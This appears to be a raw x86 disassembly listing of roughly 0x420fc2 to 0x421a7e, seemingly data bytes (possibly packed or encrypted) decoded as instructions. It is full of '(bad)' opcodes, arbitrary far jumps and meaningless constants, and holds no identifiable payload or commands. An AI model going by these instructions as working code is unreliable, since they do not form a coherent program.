  420fc2:	add    DWORD PTR [ebx+0x47],ebx
  420fc5:	in     eax,dx
  420fc6:	mov    ds:0xc73fb845,eax
  420fcb:	add    esi,DWORD PTR ds:0xf3c9628f
  420fd1:	(bad)  
  420fd2:	lods   al,BYTE PTR ds:[esi]
  420fd3:	call   0x8b6b:0xbe2ff710
  420fda:	pop    ecx
  420fdb:	xlat   BYTE PTR ds:[ebx]
  420fdc:	jmp    0xfba0:0x6fe42af9
  420fe3:	test   al,0x4e
  420fe5:	std    
  420fe6:	mov    al,ds:0x72666395
  420feb:	pop    esi
  420fec:	push   es
  420fed:	loop   0x421034
  420fef:	fdivr  QWORD PTR [eax-0x52dc080f]
  420ff5:	push   ds
  420ff6:	and    DWORD PTR [edx+0x5c72f107],0x72724bd0
  421000:	mov    BYTE PTR [edi+0x43a9d822],bl
  421006:	mov    bl,BYTE PTR [ebx-0x12]
  421009:	xchg   BYTE PTR [edx],ch
  42100b:	cmp    bl,dl
  42100d:	sar    ah,1
  42100f:	test   bl,dh
  421011:	clc    
  421012:	mov    WORD PTR [eax],gs
  421014:	jmp    0x421048
  421016:	and    DWORD PTR ds:0x7823ef29,ecx
  42101c:	mov    eax,ds:0xfa0b0866
  421021:	mov    dh,0x91
  421023:	pop    eax
  421024:	sub    al,0xd0
  421026:	xchg   DWORD PTR [ecx-0x47ddf066],ebp
  42102c:	mov    al,ds:0x9e029e9e
  421031:	pop    ecx
  421032:	push   ebp
  421033:	aas    
  421034:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421035:	les    esp,FWORD PTR [edi-0x3ade0014]
  42103b:	or     eax,DWORD PTR [ecx+0x10]
  42103e:	jmp    0x5eac714a
  421043:	inc    ebx
  421044:	mov    edi,0x8f831b66
  421049:	push   cs
  42104a:	lock cmp eax,0xbbc858bf
  421050:	not    DWORD PTR [ebp+0x643644b4]
  421056:	jae    0x42106a
  421058:	test   eax,0xeb4485cb
  42105d:	pop    DWORD PTR [esi+0x1bdb1084]
  421063:	fwait
  421064:	jae    0x420ff7
  421066:	outs   dx,DWORD PTR ds:[esi]
  421067:	cmp    DWORD PTR [ebx+0x274413dc],ebp
  42106d:	adc    cl,BYTE PTR [esi]
  42106f:	stos   DWORD PTR es:[edi],eax
  421070:	sub    al,BYTE PTR [ecx-0x341d2281]
  421076:	popa   
  421077:	fbld   TBYTE PTR [ecx]
  421079:	pop    esi
  42107a:	dec    esp
  42107b:	iret   
  42107c:	add    ebp,DWORD PTR [edx-0x1160bcdc]
  421082:	mov    bl,0x9e
  421084:	test   BYTE PTR [edi],cl
  421086:	rol    DWORD PTR [ecx-0x27],0x32
  42108a:	push   0x62726d45
  42108f:	jge    0x421091
	...
  4210f1:	add    BYTE PTR [eax],al
  4210f3:	add    BYTE PTR [edi-0x243925a2],bl
  4210f9:	(bad)  
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    fs,WORD PTR [eax]
  421101:	sub    BYTE PTR [edx],dl
  421103:	dec    ebx
  421104:	or     al,0x60
  421106:	add    DWORD PTR [eax],eax
  421108:	add    al,0x1
  42110a:	add    BYTE PTR [eax],al
  42110c:	add    ah,BYTE PTR [edi+0x7d]
  42110f:	retf   0x762c
  421112:	or     al,bh
  421114:	mov    ebx,0x877ea261
  421119:	ja     0x4210c4
  42111b:	pop    esp
  42111c:	dec    eax
  42111e:	mov    bl,0xbf
  421120:	inc    ebx
  421121:	dec    ecx
  421122:	gs sar dh,1
  421125:	cwde   
  421126:	mov    ebp,DWORD PTR [edx]
  421128:	add    al,0x3b
  42112b:	push   ds
  42112c:	sbb    al,0xc
  42112e:	mov    ebx,0x9d1f50c8
  421133:	push   ebx
  421134:	jns    0x421138
  421136:	cmp    BYTE PTR [eax+0x71],al
  421139:	push   esi
  42113a:	rcr    ch,cl
  42113c:	sahf   
  42113d:	ja     0x42116a
  42113f:	push   edi
  421140:	sbb    ebx,DWORD PTR [edi+0x1b7228dd]
  421146:	retf   
  421147:	pop    edi
  421148:	push   ecx
  421149:	push   ds
  42114a:	gs jo  0x421145
  42114d:	mul    BYTE PTR [ecx+0x66]
  421150:	clc    
  421151:	ds mov ah,0x6
  421154:	sub    al,0x2e
  421156:	mov    ch,ch
  421158:	cmp    BYTE PTR ds:0xf93bb3f9,cl
  42115e:	cldemote BYTE PTR [ecx+0x194be24f]
  421165:	or     bl,bh
  421167:	pop    esi
  421168:	mov    WORD PTR [ebx+0x3b6a816],cs
  42116e:	xor    al,0x84
  421170:	dec    edx
  421171:	adc    dh,BYTE PTR [ebx-0x7f7f1ba]
  421177:	es (bad) 
  421179:	es push 0x5a
  42117c:	int3   
  42117d:	sub    al,0x6a
  42117f:	inc    esp
  421180:	out    dx,eax
  421181:	dec    BYTE PTR [ebx+0xd]
  421184:	ret    
  421185:	sahf   
  421186:	arpl   WORD PTR [ebx],si
  421188:	(bad)  
  421189:	and    ecx,eax
  42118b:	sbb    esp,ebp
  42118d:	pop    ss
  42118e:	(bad)  
  42118f:	jo     0x421193
  421191:	and    BYTE PTR [edx],bl
  421193:	add    BYTE PTR [edx-0x3],dl
  421196:	cdq    
  421197:	int    0xd4
  421199:	jbe    0x42114c
  42119b:	aad    0x4f
  42119d:	and    al,0xa8
  42119f:	adc    ch,BYTE PTR [ebx-0x76]
  4211a2:	and    al,0xbd
  4211a4:	scas   al,BYTE PTR es:[edi]
  4211a5:	jmp    0xbcad8a72
  4211aa:	pop    esi
  4211ab:	jbe    0x421148
  4211ad:	(bad)  
  4211ae:	scas   al,BYTE PTR es:[edi]
  4211af:	jns    0x4211d8
  4211b1:	pop    edx
  4211b2:	pop    es
  4211b3:	lea    edi,[edx+eiz*4-0x43]
  4211b7:	inc    esi
  4211b8:	mov    eax,0x9f7000d1
  4211bd:	adc    eax,0x2df8266c
  4211c2:	mov    ebp,0x1cd3b66
  4211c7:	cmc    
  4211c8:	push   ss
  4211c9:	in     eax,dx
  4211ca:	cmp    al,0x53
  4211cc:	dec    esi
  4211cd:	xlat   BYTE PTR ds:[ebx]
  4211ce:	lods   al,BYTE PTR ds:[esi]
  4211cf:	imul   esi,DWORD PTR [ebx],0xb32d0fea
  4211d5:	and    eax,0x81df9821
  4211da:	dec    edi
  4211db:	add    edx,DWORD PTR [esp+eiz*4+0x18]
  4211df:	lea    eax,[edi]
  4211e1:	in     al,0x78
  4211e3:	cmp    eax,DWORD PTR [eax+0x7067bf73]
  4211e9:	aaa    
  4211ea:	lds    eax,FWORD PTR [edx-0x1b]
  4211ed:	and    dh,BYTE PTR [ebx-0x2a]
  4211f0:	mov    ebx,0x1c354071
  4211f5:	mov    ds:0x207d3b7a,eax
  4211fa:	frstor [ecx+edx*4]
  4211fd:	icebp  
  4211fe:	add    cl,BYTE PTR [esi+0x46]
  421201:	or     eax,0xdd930b59
  421206:	ins    BYTE PTR es:[edi],dx
  421207:	rcr    BYTE PTR [eax],1
  421209:	loop   0x421220
  42120b:	cmc    
  42120c:	(bad)  
  42120d:	(bad)  
  42120e:	cmp    eax,0x3b
	...
  421273:	add    BYTE PTR [esi-0x700870e1],bl
  421279:	idiv   esi
  42127b:	jg     0x42123a
  42127d:	sub    eax,0xe9b27ab3
  421282:	int    0x8c
  421284:	adc    BYTE PTR [ecx+0x1],ah
  421287:	add    BYTE PTR [ecx+eax*1],al
  42128a:	add    BYTE PTR [eax],al
  42128c:	shl    ah,0x3c
  42128f:	add    ebx,DWORD PTR [edx]
  421291:	pop    ebp
  421292:	repz xchg edx,eax
  421294:	es dec edi
  421296:	mov    ds:0x31ae07ef,al
  42129b:	out    0x20,eax
  42129d:	mov    edx,0xfcae33d7
  4212a2:	mov    esp,0x8b941a96
  4212a7:	cld    
  4212a8:	lods   al,BYTE PTR ds:[esi]
  4212a9:	mov    eax,ds:0xe994282
  4212ae:	xchg   esp,eax
  4212af:	cdq    
  4212b0:	or     DWORD PTR cs:[ebx+0x40226e8d],0x1f
  4212b8:	sub    DWORD PTR [eax-0x31],edx
  4212bb:	fbstp  TBYTE PTR [edx-0x71]
  4212be:	lods   al,BYTE PTR ds:[esi]
  4212bf:	jns    0x421263
  4212c1:	mov    bl,0xbe
  4212c3:	mov    ch,ch
  4212c5:	lock or esi,edi
  4212c8:	stos   DWORD PTR es:[edi],eax
  4212c9:	and    edi,0x8dceb6d3
  4212cf:	or     edi,DWORD PTR [esi+0x40439c5c]
  4212d5:	xor    bl,bh
  4212d7:	ss imul edx,ebx,0x42284ec4
  4212de:	xchg   BYTE PTR [esi+0x647c6800],ah
  4212e4:	daa    
  4212e5:	adc    ah,bl
  4212e7:	lods   eax,DWORD PTR ds:[esi]
  4212e8:	jecxz  0x421311
  4212ea:	dec    edx
  4212eb:	call   0x355b9a97
  4212f0:	popa   
  4212f1:	add    al,0x67
  4212f3:	popf   
  4212f4:	add    ebp,esp
  4212f6:	retf   0xc49c
  4212f9:	and    ecx,esp
  4212fb:	ret    0x91e7
  4212fe:	inc    ecx
  4212ff:	xchg   BYTE PTR [edi+0x18],ah
  421302:	sub    al,0x67
  421304:	mov    ds:0xb167e9ef,al
  421309:	scas   al,BYTE PTR es:[edi]
  42130a:	add    ecx,edx
  42130c:	cs add cl,dl
  42130f:	mov    ch,0xec
  421311:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421312:	add    eax,0xf8812a9f
  421317:	push   0xffffff89
  421319:	mov    esi,0xd797e826
  42131e:	dec    ecx
  42131f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421320:	push   edi
  421321:	push   edx
  421322:	mov    bh,0xe2
  421325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421326:	dec    ebp
  421327:	sbb    eax,ecx
  421329:	xchg   ecx,eax
  42132a:	aas    
  42132b:	xbegin 0xbfdcb4
  421331:	dec    esp
  421332:	repnz pop esp
  421334:	add    al,BYTE PTR [ebx]
  421336:	mov    ebx,DWORD PTR [edx+eiz*8-0x6f]
  42133a:	pop    ebx
  42133b:	popf   
  42133c:	mov    DWORD PTR [ebx],esp
  42133e:	pop    edx
  42133f:	in     al,dx
  421340:	not    DWORD PTR [ebp+0x3d]
  421343:	mov    al,ds:0x18a31fea
  421348:	mov    ebx,edi
  42134a:	ret    
  42134b:	ja     0xc70554dc
  421351:	and    al,0x8d
  421353:	clc    
  421354:	push   edi
  421355:	push   ds
  421356:	pop    ebp
  421357:	jns    0x4213c2
  421359:	mov    edx,0x48af7554
  42135e:	mov    BYTE PTR [eax+ebp*8+0x20],dh
  421362:	call   0x4dad40f7
  421367:	addr16 jp 0x421340
  42136a:	in     al,0xc9
  42136c:	mov    al,BYTE PTR [esi+0x5d1b4236]
  421372:	sbb    al,0x44
  421374:	add    edx,DWORD PTR [eax+edi*4+0x69]
  421378:	or     eax,0x39161c4b
  42137d:	inc    esp
  42137e:	test   DWORD PTR [ebx-0x3995851c],0x9b57098
  421388:	lods   eax,DWORD PTR ds:[esi]
  421389:	mov    al,0xc3
  42138b:	fwait
  42138c:	and    bh,BYTE PTR [eax+0x6b50]
	...
  4213f2:	add    BYTE PTR [eax],al
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp+0x724f49f]
  421402:	inc    edi
  421403:	pop    edi
  421404:	adc    al,0x62
  421406:	add    DWORD PTR [eax],eax
  421408:	add    al,0x1
  42140a:	add    BYTE PTR [eax],al
  42140c:	push   ecx
  42140d:	test   BYTE PTR [edx+0x67],ah
  421410:	repnz mov cs,WORD PTR [ebx]
  421413:	ds mov bl,0x9e
  421416:	in     al,dx
  421417:	clc    
  421418:	pop    esp
  421419:	cmc    
  42141a:	popf   
  42141b:	es repz sbb al,0xd4
  42141f:	dec    ebp
  421420:	hlt    
  421421:	test   DWORD PTR [ebx+0x5b878d74],eax
  421427:	test   eax,0xdcff3486
  42142c:	xchg   ecx,eax
  42142d:	pusha  
  42142e:	shl    DWORD PTR [edi-0x7d07c5d5],1
  421434:	call   0x1d58:0xce4f8959
  42143b:	jmp    0xaa51:0x5929a2a7
  421442:	jbe    0x421411
  421444:	push   es
  421445:	xchg   esp,eax
  421446:	push   ss
  421447:	fsubr  st,st(7)
  421449:	pop    ebx
  42144a:	xor    ebp,DWORD PTR [ebp+0x7e]
  42144d:	jae    0x4214ad
  42144f:	(bad)  
  421450:	(bad)  
  421451:	int3   
  421452:	jecxz  0x42144f
  421454:	pop    ss
  421455:	mov    al,0x98
  421457:	cmp    edx,DWORD PTR [esi+ecx*4-0xa]
  42145b:	rcl    BYTE PTR [edi*4-0x5049b55c],cl
  421462:	sub    DWORD PTR [ebx+0x3c],ebp
  421465:	dec    ecx
  421466:	fprem1 
  421468:	rcl    edi,cl
  42146a:	scas   eax,DWORD PTR es:[edi]
  42146b:	inc    esp
  42146c:	leave  
  42146d:	inc    DWORD PTR [ecx-0x43]
  421470:	aaa    
  421471:	push   ds
  421472:	sub    DWORD PTR [eax+0x36],edx
  421475:	ret    
  421476:	push   0x595bb936
  42147b:	or     DWORD PTR [edx+0x8],edi
  42147e:	add    al,0x4a
  421480:	add    eax,0x528f4992
  421485:	xor    esp,edi
  421487:	pop    es
  421488:	lea    ebx,[edi+0x67]
  42148b:	stc    
  42148c:	mov    ebp,0xfc224e76
  421491:	mov    ah,0x59
  421493:	cmp    esp,DWORD PTR [esi-0x2f610896]
  421499:	jle    0x4214a1
  42149b:	mov    ds:0xa239c6ed,eax
  4214a0:	cmp    edx,esp
  4214a2:	pop    es
  4214a3:	mov    ds:0xda6847f7,al
  4214a8:	outs   dx,BYTE PTR ds:[esi]
  4214a9:	in     eax,dx
  4214aa:	jg     0x4214ef
  4214ac:	out    dx,eax
  4214ad:	sbb    eax,0x247edec6
  4214b2:	clc    
  4214b3:	iret   
  4214b4:	mov    gs,WORD PTR [edx-0x158a27e]
  4214ba:	aaa    
  4214bb:	imul   ebx,DWORD PTR [ebx-0x45],0xdd3b6812
  4214c2:	push   cs
  4214c3:	dec    esp
  4214c4:	jb     0x421506
  4214c6:	stos   DWORD PTR es:[edi],eax
  4214c7:	jb     0x421530
  4214c9:	enter  0x5307,0xfe
  4214cd:	ret    0x3380
  4214d0:	fldcw  WORD PTR [ecx+ecx*1]
  4214d3:	call   0xa4c1:0xd688bebe
  4214da:	xchg   edi,eax
  4214db:	inc    ebx
  4214dc:	cmp    bl,BYTE PTR [edi]
  4214de:	test   DWORD PTR [ebp+0x5e],ebx
  4214e1:	sbb    eax,DWORD PTR [esi+0x6d]
  4214e4:	sub    bl,BYTE PTR [esi+edi*1-0xab814fc]
  4214eb:	push   edx
  4214ec:	sahf   
  4214ed:	add    ebx,DWORD PTR [ecx-0x5d]
  4214f0:	and    DWORD PTR [esi+0x1],0xe25d69c7
  4214f7:	mov    eax,edx
  4214f9:	xchg   ebx,eax
  4214fa:	mov    dl,BYTE PTR [edx+0x516a7459]
  421500:	jg     0x421550
  421502:	xor    eax,0x136af2f3
  421507:	imul   edx,eax,0xc4ee4116
  42150d:	mov    al,ds:0x71b7
	...
  421572:	add    BYTE PTR [eax],al
  421574:	(bad)  
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax-0xf02bd4c],bp
  421582:	daa    
  421583:	xchg   esi,eax
  421584:	sbb    BYTE PTR [ebx+0x1],ah
  421587:	add    BYTE PTR [ecx+eax*1],al
  42158a:	add    BYTE PTR [eax],al
  42158c:	and    eax,0x5483fec
  421591:	mov    WORD PTR [edi],?
  421593:	sbb    eax,0xd8f0ea21
  421598:	inc    esp
  421599:	jle    0x421603
  42159b:	jmp    0xbfd9:0xb87f4f7
  4215a2:	leave  
  4215a3:	jge    0x4215a4
  4215a5:	rcr    BYTE PTR [edi+0x78],0x2e
  4215a9:	ds loop 0x421542
  4215ac:	ror    BYTE PTR [eax-0x7add7c19],cl
  4215b2:	in     eax,dx
  4215b3:	jns    0x42157c
  4215b5:	sbb    eax,0xb978b629
  4215ba:	mov    esi,0x66072b03
  4215bf:	add    al,0x76
  4215c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215c2:	jo     0x4215ed
  4215c4:	das    
  4215c5:	call   0x678c:0x90eefd9d
  4215cc:	loope  0x421622
  4215ce:	inc    esi
  4215cf:	add    DWORD PTR [ebp+0x1a],edi
  4215d2:	add    al,0xaf
  4215d4:	jnp    0x421648
  4215d6:	ret    0x94ee
  4215d9:	mov    al,ds:0xd2e76c6d
  4215de:	imul   edi,DWORD PTR [eax],0xffffffb7
  4215e1:	adc    BYTE PTR [ebp-0x6c],al
  4215e4:	fsubr  st,st(4)
  4215e6:	sbb    eax,0x23ba5c0
  4215eb:	and    al,bl
  4215ed:	fs sbb dh,al
  4215f0:	add    DWORD PTR [ebx],edi
  4215f2:	imul   esi,DWORD PTR [esi],0xc3c9ed4a
  4215f8:	inc    esp
  4215f9:	int    0xbf
  4215fb:	dec    ebp
  4215fc:	adc    esp,ebp
  4215fe:	cli    
  4215ff:	in     eax,dx
  421600:	sub    al,0x56
  421602:	xchg   esp,eax
  421603:	push   esp
  421604:	mov    dh,0x1e
  421607:	mov    esp,edi
  421609:	xor    ebp,ecx
  42160b:	(bad)  
  42160c:	je     0x4215f9
  42160e:	push   0xf3b07af4
  421613:	test   DWORD PTR [esi+0x73],ecx
  421616:	stos   DWORD PTR es:[edi],eax
  421617:	stc    
  421618:	mov    esi,0xebb23cd4
  42161d:	mov    DWORD PTR [ecx-0x484f7701],eax
  421623:	fdivr  st(5),st
  421625:	mov    ds:0x30596dd6,eax
  42162a:	pop    edx
  42162b:	cmp    al,0x85
  42162d:	iret   
  42162e:	pop    ebx
  42162f:	jge    0x4215fd
  421631:	(bad)  
  421632:	mov    ch,0xb7
  421634:	not    DWORD PTR [edi+0x3dd419dc]
  42163a:	pop    eax
  42163b:	push   ss
  42163c:	mov    dh,0x18
  42163e:	dec    ebp
  42163f:	dec    eax
  421640:	shl    BYTE PTR [esi+0x5b],1
  421643:	shl    BYTE PTR [ebx],1
  421645:	sahf   
  421646:	ds int 0xb1
  421649:	pop    ebx
  42164a:	in     eax,0x2c
  42164c:	test   DWORD PTR [ebx-0x78],esi
  42164f:	daa    
  421650:	js     0x4216b2
  421652:	xor    eax,0x226f4f33
  421657:	je     0x421620
  421659:	pusha  
  42165a:	xor    BYTE PTR [edi],al
  42165c:	mov    eax,0x245528ef
  421661:	std    
  421662:	or     eax,DWORD PTR [esi-0x27]
  421665:	test   BYTE PTR [ecx+0x648be971],bl
  42166b:	leave  
  42166c:	and    al,0x81
  42166e:	scas   al,BYTE PTR es:[edi]
  42166f:	fcmovu st,st(7)
  421671:	stos   BYTE PTR es:[edi],al
  421672:	aaa    
  421673:	push   ds
  421674:	add    BYTE PTR [edi+0xd],0x36
  421678:	pusha  
  421679:	and    BYTE PTR [edx],dl
  42167b:	call   0xe58d24bf
  421680:	or     BYTE PTR [ecx-0x5741aaa7],ch
  421686:	and    al,0x41
  421688:	or     eax,0xe95f9702
  42168d:	jno    0x4216a1
  42168f:	add    eax,0x0
	...
  4216f4:	stos   DWORD PTR es:[edi],eax
  4216f5:	sub    al,0xed
  4216f7:	stos   BYTE PTR es:[edi],al
  4216f8:	out    dx,eax
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	pop    eax
  421701:	fucomip st,st(2)
  421703:	sub    ebx,DWORD PTR [esp+eiz*2]
  421706:	add    DWORD PTR [eax],eax
  421708:	add    al,0x1
  42170a:	add    BYTE PTR [eax],al
  42170c:	scas   al,BYTE PTR es:[edi]
  42170d:	mov    gs,WORD PTR [eax+0x7c0271bb]
  421713:	lea    ecx,[esi]
  421715:	jns    0x4216de
  421717:	mov    al,ds:0x2990c9f3
  42171c:	jbe    0x4216a5
  42171e:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  421720:	cmp    esp,ecx
  421722:	mov    WORD PTR [edi-0x5417ac6f],?
  421728:	dec    ebp
  421729:	mov    esi,0x111b1d8
  42172e:	xchg   edx,eax
  42172f:	mov    ebx,0x74ec9f31
  421734:	sub    DWORD PTR [edx+0x799a77a],ebp
  42173a:	jmp    0x69cf3ac0
  42173f:	ret    
  421740:	div    DWORD PTR [ebx]
  421742:	and    ch,cl
  421744:	nop
  421745:	rcr    dh,cl
  421747:	std    
  421748:	cs adc eax,0xffa07c33
  42174e:	xchg   ebp,eax
  42174f:	dec    esi
  421750:	out    dx,eax
  421751:	or     dl,BYTE PTR [eax+ecx*2-0x629d4748]
  421758:	nop
  421759:	es adc eax,eax
  42175c:	adc    eax,0x16615098
  421761:	out    0x73,al
  421763:	xor    DWORD PTR ds:0xbf6669ea,ebp
  421769:	in     al,0xf2
  42176b:	arpl   WORD PTR [ebp-0x7],ax
  42176e:	bound  ebp,QWORD PTR ds:0xf9cbc307
  421774:	and    eax,0x405b3f88
  421779:	mov    bl,BYTE PTR [ebx]
  42177b:	lea    edi,[edx+ebp*2-0xeb77255]
  421782:	dec    ebp
  421783:	adc    eax,0x9d60625d
  421788:	xor    BYTE PTR [edi+0x5a],ah
  42178b:	adc    BYTE PTR [edx],dl
  42178d:	in     eax,dx
  42178e:	repnz loope 0x42175a
  421791:	xor    DWORD PTR [ebx+edi*4],esi
  421794:	aad    0x5a
  421796:	fsub   DWORD PTR [esi+0x59]
  421799:	xor    al,0x7b
  42179b:	outs   dx,DWORD PTR ds:[esi]
  42179c:	shl    BYTE PTR ds:0xe7d35854,1
  4217a2:	jmp    0x9afe6e8a
  4217a7:	sbb    edx,ebp
  4217a9:	pop    ebp
  4217aa:	popa   
  4217ab:	shl    DWORD PTR [edi+ebp*8],0x8c
  4217af:	sub    ah,0x7b
  4217b2:	(bad)  
  4217b3:	jo     0x421820
  4217b5:	add    edi,DWORD PTR [eax-0x38]
  4217b8:	sbb    BYTE PTR [eax+0x44],dl
  4217bb:	xor    ah,0x1a
  4217be:	mov    dh,0xe0
  4217c0:	not    BYTE PTR [edi+0x17]
  4217c3:	pop    ecx
  4217c4:	jns    0x4217ed
  4217c6:	mov    dl,0x22
  4217c8:	clc    
  4217c9:	loop   0x42181a
  4217cb:	out    0x49,eax
  4217cd:	pop    edx
  4217ce:	push   es
  4217cf:	cwde   
  4217d0:	add    DWORD PTR [ebx+0x4c47f8d3],edi
  4217d6:	addr16 lock mov eax,ds:0x8b4f
  4217db:	gs push esp
  4217dd:	repz rol BYTE PTR ds:0x9faf2b6e,1
  4217e4:	sub    eax,0xba8ff24f
  4217e9:	adc    BYTE PTR [ebx],dl
  4217eb:	sbb    eax,0x4237c9ec
  4217f0:	sbb    eax,0x1d26841f
  4217f5:	ja     0x4217c7
  4217f7:	add    dh,BYTE PTR [ebx-0x11]
  4217fa:	pop    ebp
  4217fb:	daa    
  4217fc:	lods   eax,DWORD PTR ds:[esi]
  4217fd:	(bad)  
  4217fe:	jge    0x421857
  421800:	and    DWORD PTR [esi-0x37],edi
  421803:	sbb    BYTE PTR [ecx-0x27cf5a01],bl
  421809:	adc    ebp,DWORD PTR cs:[ebx-0x6714dbe8]
	...
  421874:	shl    DWORD PTR [eax-0x6061f47],1
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	adc    BYTE PTR [edx+0x65206f70],ch
  421886:	add    DWORD PTR [eax],eax
  421888:	add    al,0x1
  42188a:	add    BYTE PTR [eax],al
  42188c:	call   FWORD PTR [eax-0x43a79e64]
  421892:	out    dx,al
  421893:	call   0x5281452b
  421898:	jg     0x421854
  42189a:	loope  0x4218c8
  42189c:	mov    cl,0x2c
  42189e:	sub    DWORD PTR [edi+0xe],edx
  4218a1:	repz or bh,BYTE PTR [ebx-0x44]
  4218a5:	push   esi
  4218a6:	push   0x46
  4218a8:	jge    0x421910
  4218aa:	hlt    
  4218ab:	(bad)  
  4218ac:	adc    BYTE PTR [edi-0x6f],al
  4218af:	jmp    0x5f92c039
  4218b4:	cmp    ah,BYTE PTR [ebx-0x6d]
  4218b7:	jns    0x4218b3
  4218b9:	out    0x4f,al
  4218bb:	push   edx
  4218bc:	sub    al,0x6f
  4218be:	out    0xac,eax
  4218c0:	sahf   
  4218c1:	enter  0xe842,0x49
  4218c5:	dec    ebx
  4218c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218c7:	push   ebx
  4218c8:	int    0x10
  4218ca:	jnp    0x4218e4
  4218cc:	add    cl,BYTE PTR [ecx]
  4218ce:	xor    eax,DWORD PTR [edi]
  4218d0:	dec    ebx
  4218d1:	lock ror BYTE PTR [edx],cl
  4218d4:	fcmovnu st,st(1)
  4218d6:	xchg   edi,eax
  4218d7:	scas   al,BYTE PTR es:[edi]
  4218d8:	jp     0x421936
  4218da:	cmp    DWORD PTR [edi],0x2c969e8d
  4218e0:	mov    cl,0xf6
  4218e2:	fiadd  DWORD PTR [edi]
  4218e4:	inc    edi
  4218e5:	xchg   esi,eax
  4218e6:	cmp    cl,ch
  4218e8:	(bad)  
  4218e9:	loopne 0x42190d
  4218eb:	inc    edx
  4218ec:	mov    edx,0x2a2d9b91
  4218f1:	jmp    0x26c2:0xc5aa90a3
  4218f8:	int3   
  4218f9:	arpl   WORD PTR [edi+0x21],dx
  4218fc:	cli    
  4218fd:	cmp    DWORD PTR [edx],0x5153f1d6
  421903:	add    ecx,DWORD PTR [ecx-0x68]
  421906:	add    ebx,DWORD PTR [ebp+edx*4-0x5a81937]
  42190d:	ss pop edx
  42190f:	leave  
  421910:	call   0x8ef441b7
  421915:	adc    al,0x6
  421917:	scas   eax,DWORD PTR es:[edi]
  421918:	pop    eax
  421919:	out    0x70,al
  42191b:	leave  
  42191c:	mov    ebp,0x2e29f6c0
  421921:	cmp    DWORD PTR [ebp-0x347a4175],ebx
  421927:	or     eax,0x3877ca7b
  42192c:	mov    BYTE PTR [ecx-0x2b4af1ef],bh
  421932:	mov    ds:0xce9465f0,eax
  421937:	fs pop edi
  421939:	dec    ebp
  42193a:	lea    ebx,[eax+0x57]
  42193d:	pop    edx
  42193e:	leave  
  42193f:	(bad)  
  421940:	int3   
  421941:	sub    BYTE PTR [ecx],dh
  421943:	sub    al,BYTE PTR [edx+0x40]
  421946:	jae    0x421963
  421948:	push   ss
  421949:	pushf  
  42194a:	repz sub DWORD PTR [edx],esp
  42194d:	dec    ebp
  42194e:	dec    eax
  42194f:	push   edi
  421950:	xor    bl,BYTE PTR [esi]
  421952:	neg    ebx
  421954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421955:	push   es
  421956:	jns    0x4219ba
  421958:	fsub   DWORD PTR [ebx-0x5a]
  42195b:	add    eax,0x935ee92f
  421960:	jle    0x42192f
  421962:	mov    dh,0x7d
  421964:	jle    0x421919
  421966:	nop
  421967:	pop    edi
  421968:	sub    DWORD PTR [ecx-0x5a],ebx
  42196b:	das    
  42196c:	les    edx,FWORD PTR [ebx]
  42196e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42196f:	pop    edi
  421970:	test   al,0x66
  421972:	xchg   esi,eax
  421974:	sub    al,0xd6
  421976:	stc    
  421977:	sub    dl,dl
  421979:	pop    edx
  42197a:	pop    ebx
  42197b:	sbb    BYTE PTR [ebx+0x3302033],al
  421981:	mov    cl,0xb4
  421983:	fst    QWORD PTR [eax+0x47]
  421986:	adc    DWORD PTR [eax+0x53],0xffffffca
  42198a:	fdiv   QWORD PTR [ebx]
  42198c:	retf   0xd536
  42198f:	daa    
	...
  4219f4:	(bad)  
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	sbb    ch,dl
  421a02:	cld    
  421a03:	aad    0x24
  421a05:	add    WORD PTR [eax],ax
  421a08:	add    al,0x1
  421a0a:	add    BYTE PTR [eax],al
  421a0c:	and    dl,BYTE PTR [edi+ecx*4-0x10]
  421a10:	cmp    DWORD PTR [ebx],ebx
  421a12:	ret    
  421a13:	dec    esi
  421a14:	faddp  st(6),st
  421a16:	(bad)  
  421a17:	out    dx,al
  421a18:	push   ebx
  421a19:	shr    DWORD PTR [edi+0x394c3fdf],0x22
  421a20:	mov    dl,BYTE PTR [edx+0x3121be57]
  421a26:	mov    eax,0xb6465c89
  421a2b:	xor    BYTE PTR [eax-0x62fc243a],0x3d
  421a32:	push   esp
  421a33:	add    BYTE PTR [ecx+0x54],bh
  421a36:	xor    eax,0x404d492f
  421a3b:	mov    cl,0x66
  421a3d:	jo     0x421a98
  421a3f:	cmp    DWORD PTR [esi+0x75],ebp
  421a42:	sub    al,0x26
  421a44:	test   BYTE PTR [edi+0x52],dl
  421a47:	test   al,0xfa
  421a49:	call   0x7aae4154
  421a4e:	add    al,dl
  421a50:	addr16 mov dh,0x93
  421a53:	into   
  421a54:	ds mov esp,0x821ecffc
  421a5a:	jne    0x421a7a
  421a5c:	nop
  421a5d:	hlt    
  421a5e:	cmc    
  421a5f:	or     BYTE PTR [edx+0xe],al
  421a62:	push   ds
  421a63:	loope  0x421a38
  421a65:	sub    al,0xeb
  421a67:	xchg   BYTE PTR [edi],bl
  421a69:	aad    0x5c
  421a6b:	stc    
  421a6c:	sbb    al,0x98
  421a6e:	mov    edx,0x1b65f606
  421a73:	xor    al,0x9e
  421a75:	cdq    
  421a76:	imul   ebx,ecx,0xfffffffd
  421a79:	sbb    al,0x97
  421a7b:	(bad)  
  421a7c:	mov    bl,0x28
  421a7e:	jmp    0x689268a
